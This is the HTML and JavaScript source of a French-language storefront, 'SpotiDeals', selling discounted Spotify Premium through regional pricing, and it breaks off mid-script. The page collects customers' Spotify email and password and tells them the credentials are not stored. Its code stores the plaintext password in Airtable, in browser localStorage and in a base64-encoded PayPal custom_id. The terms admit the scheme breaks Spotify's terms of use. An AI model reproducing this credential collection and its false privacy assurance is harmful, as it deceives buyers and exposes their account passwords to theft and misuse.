<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>SpotiDeals – Spotify Premium 53% moins cher</title>
  <meta name="description" content="La même musique, 53% moins cher. Spotify Premium 12 mois à 82,62$ CAD. Activation garantie, paiement sécurisé, service client réactif.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <link rel="icon" type="image/png" href="favicon/favicon-32x32.png">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Poppins', Arial, sans-serif;
      background: linear-gradient(135deg, #181c20 0%, #232a34 100%);
      color: #f3f3f3;
      line-height: 1.7;
      min-height: 100vh;
      overflow-x: hidden;
    }
    
    .container {
      max-width: 1152px;
      margin: 0 auto;
      padding: 0 24px;
    }
    
    /* Header */
    .main-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 1.2rem 2.5rem;
      background: rgba(24,28,32,0.92);
      backdrop-filter: blur(8px);
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 2px 16px rgba(29, 185, 84, 0.13);
    }
    
    .logo-svg {
      height: 44px;
      border-radius: 50%;
      box-shadow: 0 2px 12px rgba(29, 185, 84, 0.2);
    }
    
    .main-nav {
      display: flex;
      gap: 1.5rem;
      align-items: center;
    }
    
    .main-nav a {
      color: #f3f3f3;
      text-decoration: none;
      font-weight: 600;
      font-size: 1.05rem;
      padding: 0.5rem 1rem;
      border-radius: 1.2rem;
      transition: all 0.3s ease;
    }
    
    .main-nav a:hover {
      background: rgba(29, 185, 84, 0.1);
      color: #1db954;
    }
    
    .btn-nav {
      background: #1db954 !important;
      color: white !important;
      padding: 0.7rem 1.5rem !important;
    }
    
    .btn-nav:hover {
      background: #1ed760 !important;
      transform: translateY(-2px);
    }
    
    /* Hero Section */
    .hero-section {
      padding: 80px 0;
      text-align: center;
      position: relative;
    }
    
    .hero-content {
      max-width: 800px;
      margin: 0 auto;
    }
    
    .badge-clients {
      display: inline-block;
      background: rgba(29, 185, 84, 0.1);
      color: #1db954;
      padding: 0.5rem 1rem;
      border-radius: 50px;
      font-size: 0.9rem;
      font-weight: 600;
      margin-bottom: 2rem;
      border: 1px solid rgba(29, 185, 84, 0.3);
    }
    
    .hero-section h1 {
      font-size: 3.5rem;
      font-weight: 700;
      margin-bottom: 1.5rem;
      line-height: 1.2;
    }
    
    .accent {
      color: #1db954;
      background: linear-gradient(135deg, #1db954, #24e38c);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .hero-sub {
      font-size: 1.3rem;
      margin-bottom: 2.5rem;
      opacity: 0.9;
    }
    
    .btn-cta {
      background: linear-gradient(135deg, #1db954, #24e38c);
      color: white;
      padding: 1rem 2.5rem;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      text-decoration: none;
      display: inline-block;
      box-shadow: 0 4px 20px rgba(29, 185, 84, 0.3);
    }
    
    .btn-cta:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 30px rgba(29, 185, 84, 0.4);
    }
    
    /* Steps Section */
    .steps-section {
      padding: 80px 0;
      background: rgba(255, 255, 255, 0.02);
    }
    
    .steps-section h2 {
      text-align: center;
      font-size: 2.5rem;
      margin-bottom: 3rem;
      color: #1db954;
    }
    
    .steps-grid {
      display: grid;
      grid-template-columns: 1fr auto 1fr auto 1fr;
      gap: 2rem;
      align-items: center;
      max-width: 1000px;
      margin: 0 auto;
    }
    
    .step-card {
      background: rgba(255, 255, 255, 0.05);
      padding: 2rem;
      border-radius: 1rem;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: all 0.3s ease;
    }
    
    .step-card:hover {
      transform: translateY(-5px);
      background: rgba(255, 255, 255, 0.08);
    }
    
    .step-number {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 50px;
      height: 50px;
      background: #1db954;
      color: white;
      border-radius: 50%;
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 1rem;
    }
    
    .step-card h3 {
      font-size: 1.3rem;
      margin-bottom: 1rem;
      color: #1db954;
    }
    
    .step-arrow {
      display: flex;
      justify-content: center;
    }
    
    /* Footer simple */
    .footer {
      background: rgba(0, 0, 0, 0.3);
      padding: 2rem 0;
      text-align: center;
      margin-top: 4rem;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .main-nav {
        display: none;
      }
      
      .hero-section h1 {
        font-size: 2.5rem;
      }
      
      .steps-grid {
        grid-template-columns: 1fr;
        gap: 1.5rem;
      }
      
      .step-arrow {
        display: none;
      }
    }
    
    /* Animations */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .hero-content {
      animation: fadeInUp 0.8s ease-out;
    }
    
    .step-card {
      animation: fadeInUp 0.8s ease-out;
    }
    
    .step-card:nth-child(1) { animation-delay: 0.1s; }
    .step-card:nth-child(3) { animation-delay: 0.2s; }
    .step-card:nth-child(5) { animation-delay: 0.3s; }
  </style>
</head>
<body>
  <!-- Header -->
  <header class="main-header">
    <a href="#" class="logo-link">
      <img src="images/logo.svg" alt="SpotiDeals Logo" class="logo-svg">
    </a>
    <nav class="main-nav">
      <a href="#hero">Accueil</a>
      <a href="#etapes">Étapes</a>
      <a href="#prix">Prix</a>
      <a href="#commande" class="btn-nav">Commander</a>
    </nav>
  </header>

  <!-- Hero Section -->
  <section id="hero" class="hero-section">    <div class="container">
      <div class="hero-content">
        <h1>La même musique, <span class="accent">53 % moins cher</span></h1>
        <p class="hero-sub">Spotify Premium 12 mois à <b>82,62 $ CAD</b> au lieu de 175,12 $ CAD.</p>
        <a href="#commande" class="btn-cta">Commander maintenant</a>
      </div>
    </div>
  </section>

  <!-- Étapes -->
  <section id="etapes" class="steps-section">
    <div class="container">
      <h2>Comment ça marche</h2>
      <div class="steps-grid">
        <div class="step-card">
          <div class="step-number">1</div>
          <h3>Commander</h3>
          <p>Payez en toute sécurité via PayPal. Votre commande est immédiatement enregistrée.</p>
        </div>
        <div class="step-arrow">
          <i class="fas fa-arrow-right" style="color: #24e38c; font-size: 1.5rem;"></i>
        </div>
        <div class="step-card">
          <div class="step-number">2</div>
          <h3>Activation (48-72h)</h3>
          <p>Notre équipe active votre abonnement sous 3 jours ouvrés maximum.</p>
        </div>
        <div class="step-arrow">
          <i class="fas fa-arrow-right" style="color: #24e38c; font-size: 1.5rem;"></i>
        </div>
        <div class="step-card">
          <div class="step-number">3</div>
          <h3>Profiter</h3>
          <p>Connectez-vous à votre compte Spotify et profitez de votre abonnement Premium !</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Section Commande -->
  <section id="commande" style="padding: 80px 0; text-align: center;">
    <div class="container">
      <h2 style="color: #1db954; margin-bottom: 2rem; font-size: 2.5rem;">Commander votre abonnement</h2>
      <div style="max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.05); padding: 3rem; border-radius: 1rem; border: 1px solid rgba(255,255,255,0.1);">
        <div style="background: linear-gradient(135deg, #1db954, #24e38c); color: white; padding: 2rem; border-radius: 1rem; margin-bottom: 2rem;">
          <h3 style="font-size: 1.5rem; margin-bottom: 0.5rem;">Spotify Premium 12 mois</h3>
          <div style="font-size: 2.5rem; font-weight: 700;">82,62 $ CAD</div>
          <div style="opacity: 0.9;">au lieu de 175,12 $ CAD</div>
        </div>        <p style="margin-bottom: 2rem;">✓ Activation sous 48-72h<br>✓ Garantie 12 mois<br>✓ Support client réactif</p>
        
        <!-- Conditions obligatoires -->
        <div style="text-align: left; margin-bottom: 2rem; background: rgba(255,193,7,0.1); padding: 1.5rem; border-radius: 0.5rem; border: 1px solid rgba(255,193,7,0.3);">
          <h4 style="color: #ffc107; margin-bottom: 1rem; text-align: center;"><i class="fas fa-exclamation-triangle"></i> Conditions importantes</h4>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: flex; align-items: flex-start; gap: 0.5rem; cursor: pointer; font-size: 0.9rem;">
              <input type="checkbox" id="condition1" class="condition-checkbox" style="margin-top: 0.2rem;">
              <span><strong>Je confirme que je n'ai PAS d'abonnement Spotify Premium actif</strong> (obligatoire pour l'activation)</span>
            </label>
          </div>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: flex; align-items: flex-start; gap: 0.5rem; cursor: pointer; font-size: 0.9rem;">
              <input type="checkbox" id="condition2" class="condition-checkbox" style="margin-top: 0.2rem;">
              <span><strong>J'accepte que SpotiDeals accède temporairement à mon compte Spotify</strong> pour l'activation de l'abonnement Premium dans une région aux tarifs avantageux (100% légal)</span>
            </label>
          </div>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: flex; align-items: flex-start; gap: 0.5rem; cursor: pointer; font-size: 0.9rem;">
              <input type="checkbox" id="condition3" class="condition-checkbox" style="margin-top: 0.2rem;">
              <span><strong>Je comprends les risques</strong> : Cette méthode utilise des tarifs régionaux légitimes mais peut être contre les conditions d'utilisation de Spotify</span>
            </label>
          </div>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: flex; align-items: flex-start; gap: 0.5rem; cursor: pointer; font-size: 0.9rem;">
              <input type="checkbox" id="condition4" class="condition-checkbox" style="margin-top: 0.2rem;">
              <span>J'ai lu et j'accepte les <a href="#" onclick="showTerms()" style="color: #1db954; text-decoration: underline;">termes et conditions complètes</a></span>
            </label>
          </div>        </div>
        
        <!-- Formulaire identifiants Spotify (apparaît après conditions) -->
        <div id="spotify-credentials" style="display: none; text-align: left; margin-bottom: 2rem; background: rgba(29,185,84,0.1); padding: 1.5rem; border-radius: 0.5rem; border: 1px solid rgba(29,185,84,0.3);">
          <h4 style="color: #1db954; margin-bottom: 1rem; text-align: center;"><i class="fas fa-user-lock"></i> Identifiants Spotify requis</h4>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: block; margin-bottom: 0.5rem; font-weight: 600; color: #1db954;">
              <i class="fas fa-envelope"></i> Email de votre compte Spotify :
            </label>
            <input type="email" id="spotify-email" placeholder="votre.email@example.com" required
                   style="width: 100%; padding: 0.8rem; border-radius: 0.5rem; border: 1px solid rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); color: #f3f3f3; font-size: 1rem;">
          </div>
          
          <div style="margin-bottom: 1rem;">
            <label style="display: block; margin-bottom: 0.5rem; font-weight: 600; color: #1db954;">
              <i class="fas fa-lock"></i> Mot de passe de votre compte Spotify :
            </label>
            <input type="password" id="spotify-password" placeholder="Votre mot de passe" required
                   style="width: 100%; padding: 0.8rem; border-radius: 0.5rem; border: 1px solid rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); color: #f3f3f3; font-size: 1rem;">
          </div>
          
          <div style="background: rgba(255,193,7,0.1); padding: 1rem; border-radius: 0.5rem; border: 1px solid rgba(255,193,7,0.3); margin-bottom: 1rem;">
            <p style="font-size: 0.85rem; color: #ffc107; margin: 0;">
              <i class="fas fa-shield-alt"></i> <strong>Sécurité :</strong> Vos identifiants sont utilisés uniquement pour l'activation et ne sont pas stockés. Nous recommandons de changer votre mot de passe après l'activation.
            </p>
          </div>
        </div>
        
        <div id="paypal-button-container" style="margin-bottom: 1rem; opacity: 0.5; pointer-events: none;"></div>
        <button id="paypal-fallback" class="btn-cta" style="width: 100%; display: none; opacity: 0.5; pointer-events: none;">Acceptez toutes les conditions et remplissez vos identifiants</button>
      </div>
    </div>
  </section>
  <!-- Footer -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2025 Spotideals. Tous droits réservés. Spotify® est une marque déposée qui n'est pas affiliée à ce site.</p>
    </div>
  </footer>
  <!-- Script PayPal -->
  <!-- Script EmailJS -->
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script src="https://www.paypal.com/sdk/js?client-id=AW-bLBrtEPaB0FTD-Oa4rQ1gbQBNLkkqSsAtGh968nfbb-HA_iZh-Cptg_1UzbE9GYagkCPtHFEUosfm&currency=CAD&components=buttons"></script>
  
  <!-- Script simple et sûr -->  <script>    // =================== CONFIGURATION ===================
    const CONFIG = {
      // EmailJS
      emailjs: {
        serviceId: 'service_ajkhda1',
        templateId: 'commande_status',
        publicKey: 'jQBmJJM9MbN5JZdlc' // Remplacez par votre vraie clé EmailJS
      },
      // Airtable (via proxy)
      airtable: {
        apiUrl: '/airtable', // Cloudflare Worker proxy
        fallbackStorage: true
      },
      // Support
      support: {
        email: 'support@spotideals.com',
        phone: '+1-555-SPOTIFY'
      }
    };
    
    // =================== UTILITAIRES ===================
    function generateOrderId() {
      const timestamp = Date.now().toString(36);
      const random = Math.random().toString(36).substr(2, 5);
      return `SD-${timestamp}-${random}`.toUpperCase();
    }
    
    function formatDate(date) {
      return new Intl.DateTimeFormat('fr-CA', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
      }).format(date);
    }
      // =================== AIRTABLE INTEGRATION ===================
    async function saveOrderToAirtable(orderData) {
      try {
        console.log('💾 Sauvegarde commande dans Airtable...', orderData.orderId);
        
        const airtableData = {
          records: [{
            fields: {
              'Order ID': orderData.orderId,
              'Email Spotify': orderData.spotifyEmail,
              'Mot de passe': orderData.spotifyPassword,
              'Email Client': orderData.customerEmail || orderData.spotifyEmail,
              'Nom Client': orderData.customerName || 'Client SpotiDeals',
              'PayPal Transaction': orderData.paypalTransactionId,
              'Montant': parseFloat(orderData.amount),
              'Devise': orderData.currency,
              'Statut': 'En attente',
              'Date Commande': orderData.orderDate,
              'Date Activation Prevue': orderData.expectedActivation,
              'URL Suivi': `https://spotideals.github.io/suivi-commande.html?order=${orderData.orderId}`
            }
          }]
        };
        
        const response = await fetch(CONFIG.airtable.apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(airtableData)
        });
        
        const responseData = await response.json();
        
        if (response.ok) {
          console.log('✅ Commande sauvegardée dans Airtable:', responseData);
          return { success: true, data: responseData };
        } else {
          throw new Error(`Airtable Error ${response.status}: ${responseData.error?.message || response.statusText}`);
        }
      } catch (error) {
        console.error('❌ Erreur Airtable:', error);
        
        // Fallback: sauvegarder en localStorage avec structure complète
        if (CONFIG.airtable.fallbackStorage) {
          try {
            const fallbackOrder = {
              ...orderData,
              savedAt: new Date().toISOString(),
              source: 'localStorage_fallback',
              status: 'En attente'
            };
            
            // Sauvegarder la commande individuelle
            localStorage.setItem(`order_${orderData.orderId}`, JSON.stringify(fallbackOrder));
            
            // Ajouter à la liste des commandes
            const orders = JSON.parse(localStorage.getItem('spotideals_orders') || '[]');
            orders.push(fallbackOrder);
            localStorage.setItem('spotideals_orders', JSON.stringify(orders));
            
            // Marquer pour sync plus tard
            const pendingSync = JSON.parse(localStorage.getItem('spotideals_pending_sync') || '[]');
            pendingSync.push({
              orderId: orderData.orderId,
              timestamp: new Date().toISOString(),
              retryCount: 0
            });
            localStorage.setItem('spotideals_pending_sync', JSON.stringify(pendingSync));
            
            console.log('💾 Commande sauvegardée en fallback (localStorage):', orderData.orderId);
            return { success: true, fallback: true };
          } catch (fallbackError) {
            console.error('❌ Erreur fallback localStorage:', fallbackError);
            return { success: false, error: fallbackError.message };
          }
        }
        
        return { success: false, error: error.message };
      }
    }
      // =================== EMAILJS INTEGRATION ===================
    async function sendConfirmationEmail(orderData) {
      try {
        // Vérifier que EmailJS est disponible
        if (typeof emailjs === 'undefined') {
          console.warn('⚠️ EmailJS non chargé, tentative de chargement...');
          // Fallback : charger EmailJS si pas disponible
          await new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://cdn.emailjs.com/dist/email.min.js';
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
          });
        }
        
        // Initialiser EmailJS
        emailjs.init(CONFIG.emailjs.publicKey);
        console.log('📧 Initialisation EmailJS...');
        
        const templateParams = {
          to_email: orderData.customerEmail || orderData.spotifyEmail,
          customer_name: orderData.customerName || 'Client SpotiDeals',
          order_id: orderData.orderId,
          spotify_email: orderData.spotifyEmail,
          amount: orderData.amount,
          currency: orderData.currency,
          order_date: formatDate(new Date(orderData.orderDate)),
          expected_activation: formatDate(new Date(orderData.expectedActivation)),
          paypal_transaction: orderData.paypalTransactionId,
          support_email: CONFIG.support.email
        };
        
        console.log('📧 Envoi email avec params:', {
          to: templateParams.to_email,
          orderId: templateParams.order_id,
          template: CONFIG.emailjs.templateId
        });
        
        const response = await emailjs.send(
          CONFIG.emailjs.serviceId,
          CONFIG.emailjs.templateId,
          templateParams
        );
        
        console.log('✅ Email de confirmation envoyé avec succès:', response);
        return true;
      } catch (error) {
        console.error('❌ Erreur envoi email:', error);
        
        // Sauvegarde des détails pour retry manuel
        const emailBackup = {
          orderId: orderData.orderId,
          email: orderData.customerEmail || orderData.spotifyEmail,
          templateParams: {
            order_id: orderData.orderId,
            spotify_email: orderData.spotifyEmail,
            amount: orderData.amount,
            paypal_transaction: orderData.paypalTransactionId
          },
          error: error.message,
          timestamp: new Date().toISOString()
        };
        
        // Stocker pour retry plus tard
        const failedEmails = JSON.parse(localStorage.getItem('spotideals_failed_emails') || '[]');
        failedEmails.push(emailBackup);
        localStorage.setItem('spotideals_failed_emails', JSON.stringify(failedEmails));
        
        console.log('💾 Email sauvé pour retry:', emailBackup);
        return false;
      }
    }
      // =================== PROCESSUS COMPLET DE COMMANDE ===================
    async function processOrder(spotifyEmail, spotifyPassword, paypalDetails) {
      const orderId = generateOrderId();
      const orderDate = new Date().toISOString();
      const expectedActivation = new Date(Date.now() + 72 * 60 * 60 * 1000).toISOString(); // +72h
      
      const orderData = {
        orderId,
        spotifyEmail,
        spotifyPassword,
        customerEmail: paypalDetails.payer?.email_address || spotifyEmail,
        customerName: paypalDetails.payer?.name ? 
          `${paypalDetails.payer.name.given_name} ${paypalDetails.payer.name.surname}` : 
          'Client SpotiDeals',
        paypalTransactionId: paypalDetails.id,
        amount: '82.62',
        currency: 'CAD',
        orderDate,
        expectedActivation,
        status: 'En attente',
        paypalDetails: {
          payerId: paypalDetails.payer?.payer_id,
          payerEmail: paypalDetails.payer?.email_address,
          transactionId: paypalDetails.id,
          purchaseUnits: paypalDetails.purchase_units
        }
      };
      
      console.log('🚀 Traitement de la commande:', orderId);
      console.log('📊 Données commande:', {
        orderId,
        email: spotifyEmail,
        customer: orderData.customerName,
        amount: orderData.amount,
        paypalTx: paypalDetails.id
      });
      
      // 1. Sauvegarder dans Airtable
      console.log('📝 Étape 1/2: Sauvegarde Airtable...');
      const airtableResult = await saveOrderToAirtable(orderData);
      
      // 2. Envoyer email de confirmation
      console.log('📧 Étape 2/2: Envoi email...');
      const emailResult = await sendConfirmationEmail(orderData);
      
      // 3. Logger les résultats détaillés
      const processingResult = {
        success: true,
        orderId,
        orderData,
        airtable: airtableResult,
        email: emailResult,
        timestamp: new Date().toISOString()
      };
      
      console.log('📋 Résultat du traitement:', processingResult);
      
      // 4. Sauvegarder le résultat pour debug
      try {
        const processHistory = JSON.parse(localStorage.getItem('spotideals_process_history') || '[]');
        processHistory.push(processingResult);
        // Garder seulement les 50 dernières
        if (processHistory.length > 50) {
          processHistory.splice(0, processHistory.length - 50);
        }
        localStorage.setItem('spotideals_process_history', JSON.stringify(processHistory));
      } catch (e) {
        console.warn('Impossible de sauvegarder l\'historique:', e);
      }
      
      // 5. Retourner le résultat avec informations de compatibilité
      return {
        success: true,
        orderId,
        airtableSaved: airtableResult.success,
        emailSent: emailResult,
        orderData,
        details: {
          airtable: airtableResult,
          email: emailResult ? 'sent' : 'failed',
          fallbackUsed: airtableResult.fallback || false
        }
      };
    }
    
    document.addEventListener('DOMContentLoaded', function() {
      console.log('🎯 SpotiDeals - Système de commande initialisé');
        // Gestion des conditions et formulaire
      const conditionCheckboxes = document.querySelectorAll('.condition-checkbox');
      const paypalContainer = document.getElementById('paypal-button-container');
      const fallbackButton = document.getElementById('paypal-fallback');
      const spotifyCredentials = document.getElementById('spotify-credentials');
      const spotifyEmail = document.getElementById('spotify-email');
      const spotifyPassword = document.getElementById('spotify-password');
      
      function checkConditions() {
        const allChecked = Array.from(conditionCheckboxes).every(checkbox => checkbox.checked);
        
        if (allChecked) {
          // Afficher le formulaire des identifiants
          spotifyCredentials.style.display = 'block';
          spotifyCredentials.scrollIntoView({ behavior: 'smooth', block: 'center' });
          
          // Vérifier si les identifiants sont remplis
          checkCredentials();
        } else {
          // Cacher le formulaire et désactiver PayPal
          spotifyCredentials.style.display = 'none';
          paypalContainer.style.opacity = '0.5';
          paypalContainer.style.pointerEvents = 'none';
          fallbackButton.textContent = 'Acceptez toutes les conditions et remplissez vos identifiants';
          fallbackButton.style.opacity = '0.5';
          fallbackButton.style.pointerEvents = 'none';
        }
      }
      
      function checkCredentials() {
        const allConditionsChecked = Array.from(conditionCheckboxes).every(checkbox => checkbox.checked);
        const emailFilled = spotifyEmail.value.trim() !== '';
        const passwordFilled = spotifyPassword.value.trim() !== '';
        const emailValid = spotifyEmail.checkValidity();
        
        if (allConditionsChecked && emailFilled && passwordFilled && emailValid) {
          // Tout est prêt, activer PayPal
          paypalContainer.style.opacity = '1';
          paypalContainer.style.pointerEvents = 'auto';
          fallbackButton.textContent = 'Payer avec PayPal';
          fallbackButton.style.opacity = '1';
          fallbackButton.style.pointerEvents = 'auto';
          
          // Initialiser PayPal
          initPayPal();
        } else {
          // Désactiver PayPal
          paypalContainer.style.opacity = '0.5';
          paypalContainer.style.pointerEvents = 'none';
          
          if (!allConditionsChecked) {
            fallbackButton.textContent = 'Acceptez toutes les conditions et remplissez vos identifiants';
          } else if (!emailFilled || !passwordFilled) {
            fallbackButton.textContent = 'Remplissez vos identifiants Spotify pour continuer';
          } else if (!emailValid) {
            fallbackButton.textContent = 'Adresse email invalide';
          }
          
          fallbackButton.style.opacity = '0.5';
          fallbackButton.style.pointerEvents = 'none';
        }
      }
      
      // Écouter les changements des checkboxes
      conditionCheckboxes.forEach(checkbox => {
        checkbox.addEventListener('change', checkConditions);
      });
      
      // Écouter les changements dans les champs identifiants
      spotifyEmail.addEventListener('input', checkCredentials);
      spotifyPassword.addEventListener('input', checkCredentials);
      spotifyEmail.addEventListener('blur', checkCredentials);
      spotifyPassword.addEventListener('blur', checkCredentials);
      
      // Fonction pour afficher les termes
      window.showTerms = function() {
        const modal = document.createElement('div');
        modal.style.cssText = `
          position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
          background: rgba(0,0,0,0.8); z-index: 10000; display: flex; 
          align-items: center; justify-content: center; padding: 2rem;
        `;
        
        modal.innerHTML = `
          <div style="background: #232a34; padding: 2rem; border-radius: 1rem; max-width: 600px; max-height: 80vh; overflow-y: auto; color: #f3f3f3;">
            <h3 style="color: #1db954; margin-bottom: 1rem;">Termes et Conditions - SpotiDeals</h3>
            <div style="line-height: 1.6; font-size: 0.9rem;">
              <h4 style="color: #1db954; margin: 1rem 0 0.5rem;">1. Nature du service</h4>
              <p>SpotiDeals active des abonnements Spotify Premium en utilisant des tarifs régionaux légitimes disponibles dans certains pays. Cette méthode est 100% légale mais peut être contraire aux conditions d'utilisation de Spotify.</p>
              
              <h4 style="color: #1db954; margin: 1rem 0 0.5rem;">2. Processus d'activation</h4>
              <p>• Nous accédons temporairement à votre compte Spotify<br>
              • L'activation se fait depuis un pays aux tarifs avantageux<br>
              • Durée : 48-72h maximum<br>
              • Vous recevrez les identifiants par email</p>
              
              <h4 style="color: #1db954; margin: 1rem 0 0.5rem;">3. Prérequis obligatoires</h4>
              <p>• Aucun abonnement Premium actif<br>
              • Compte Spotify existant requis<br>
              • Accepter l'accès temporaire à votre compte</p>
              
              <h4 style="color: #1db954; margin: 1rem 0 0.5rem;">4. Garanties</h4>
              <p>• Activation sous 72h ou remboursement<br>
              • Remplacement gratuit en cas de problème<br>
              • Support client 7j/7</p>
              
              <h4 style="color: #1db954; margin: 1rem 0 0.5rem;">5. Risques et responsabilités</h4>
              <p>• Spotify pourrait suspendre le compte (rare)<br>
              • Méthode légale mais contraire aux CGU Spotify<br>
              • Utilisez ce service en toute connaissance de cause</p>
            </div>
            <button onclick="this.parentElement.parentElement.remove()" style="background: #1db954; color: white; border: none; padding: 0.8rem 2rem; border-radius: 0.5rem; margin-top: 1rem; cursor: pointer; width: 100%;">
              J'ai lu et compris
            </button>
          </div>
        `;
        
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
          if (e.target === modal) {
            modal.remove();
          }
        });
      };
      
      // Fonction pour initialiser PayPal (seulement si conditions acceptées)
      function initPayPal() {
        if (typeof paypal !== 'undefined' && !document.querySelector('#paypal-button-container .paypal-buttons')) {
          paypal.Buttons({
            style: {
              layout: 'vertical',
              color: 'gold',
              shape: 'rect',
              label: 'paypal'
            },            createOrder: function(data, actions) {
              // Récupérer les identifiants pour les inclure dans la commande
              const email = spotifyEmail.value;
              const password = spotifyPassword.value;
              
              return actions.order.create({
                purchase_units: [{
                  amount: {
                    value: '82.62',
                    currency_code: 'CAD'
                  },
                  description: 'Spotify Premium 12 mois - SpotiDeals',
                  custom_id: btoa(email + ':' + password) // Encoder les identifiants (base64)
                }]              });
            },            onApprove: function(data, actions) {
              return actions.order.capture().then(async function(details) {
                // Traitement complet de la commande
                try {
                  const result = await processOrder(
                    spotifyEmail.value,
                    spotifyPassword.value,
                    details
                  );
                  
                  if (result.success) {
                    // Créer un message de confirmation détaillé
                    const successModal = document.createElement('div');
                    successModal.style.cssText = `
                      position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                      background: rgba(0,0,0,0.8); z-index: 10000; display: flex; 
                      align-items: center; justify-content: center; padding: 2rem;
                    `;
                    
                    successModal.innerHTML = `
                      <div style="background: #232a34; padding: 2rem; border-radius: 1rem; max-width: 600px; text-align: center; color: #f3f3f3;">
                        <div style="color: #1db954; font-size: 4rem; margin-bottom: 1rem;">✅</div>
                        <h3 style="color: #1db954; margin-bottom: 1rem;">Commande confirmée !</h3>
                        
                        <div style="background: rgba(29,185,84,0.1); padding: 1.5rem; border-radius: 0.5rem; margin-bottom: 1.5rem; text-align: left;">
                          <h4 style="color: #1db954; margin-bottom: 1rem;">📋 Détails de votre commande :</h4>
                          <p style="margin: 0.5rem 0;"><strong>🎫 Numéro de commande :</strong> ${result.orderId}</p>
                          <p style="margin: 0.5rem 0;"><strong>📧 Email Spotify :</strong> ${spotifyEmail.value}</p>
                          <p style="margin: 0.5rem 0;"><strong>💰 Montant payé :</strong> 82,62 $ CAD</p>
                          <p style="margin: 0.5rem 0;"><strong>📋 Transaction PayPal :</strong> ${details.id}</p>
                        </div>
                        
                        <div style="background: rgba(255,193,7,0.1); padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
                          <p style="color: #ffc107; margin: 0; font-size: 0.9rem;">
                            <strong>⏰ Activation prévue :</strong> 48-72h maximum<br>
                            <strong>📧 Email de confirmation :</strong> ${result.emailSent ? 'Envoyé ✅' : 'En cours d\'envoi ⏳'}<br>
                            <strong>💾 Commande enregistrée :</strong> ${result.airtableSaved ? 'Airtable ✅' : 'Backup local ✅'}
                          </p>
                        </div>
                        
                        <div style="background: rgba(29,185,84,0.1); padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
                          <p style="color: #1db954; margin: 0; font-size: 0.9rem;">
                            <strong>🔍 Suivi de commande :</strong><br>
                            Utilisez votre numéro de commande <strong>${result.orderId}</strong><br>
                            <a href="suivi-commande.html?order=${result.orderId}" target="_blank" style="color: #1db954; text-decoration: underline;">👉 Accéder au suivi</a>
                          </p>
                        </div>
                        
                        <button onclick="this.parentElement.parentElement.remove()" style="background: #1db954; color: white; border: none; padding: 1rem 2rem; border-radius: 0.5rem; cursor: pointer; font-size: 1rem;">
                          Parfait ! Merci 🎉
                        </button>
                      </div>
                    `;
                    
                    document.body.appendChild(successModal);
                    console.log('🎉 Commande traitée avec succès:', result.orderId);
                    console.log('Transaction completed by', details.payer?.name?.given_name || 'Client');
                    console.log('Spotify credentials securely collected for activation');
                  } else {
                    throw new Error('Erreur lors du traitement de la commande');
                  }
                } catch (error) {
                  console.error('❌ Erreur traitement commande:', error);
                  
                  // Modal d'erreur plus élégante
                  const errorModal = document.createElement('div');
                  errorModal.style.cssText = `
                    position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                    background: rgba(0,0,0,0.8); z-index: 10000; display: flex; 
                    align-items: center; justify-content: center; padding: 2rem;
                  `;
                  errorModal.innerHTML = `
                    <div style="background: #232a34; padding: 2rem; border-radius: 1rem; max-width: 500px; text-align: center; color: #f3f3f3;">
                      <div style="color: #ff4444; font-size: 3rem; margin-bottom: 1rem;">⚠️</div>
                      <h3 style="color: #ff4444; margin-bottom: 1rem;">Erreur technique</h3>
                      <p style="margin-bottom: 1rem;">Votre paiement a été traité avec succès, mais une erreur technique est survenue.</p>
                      <div style="background: rgba(255,68,68,0.1); padding: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; font-size: 0.9rem;">
                        <p><strong>ID Transaction :</strong> ${details.id}</p>
                        <p>Veuillez contacter notre support avec cet ID.</p>
                      </div>
                      <button onclick="this.parentElement.parentElement.remove()" style="background: #ff4444; color: white; border: none; padding: 1rem 2rem; border-radius: 0.5rem; cursor: pointer;">
                        Contacter le support
                      </button>
                    </div>
                  `;                  document.body.appendChild(errorModal);
                }
              });
            },
            onError: function(err) {
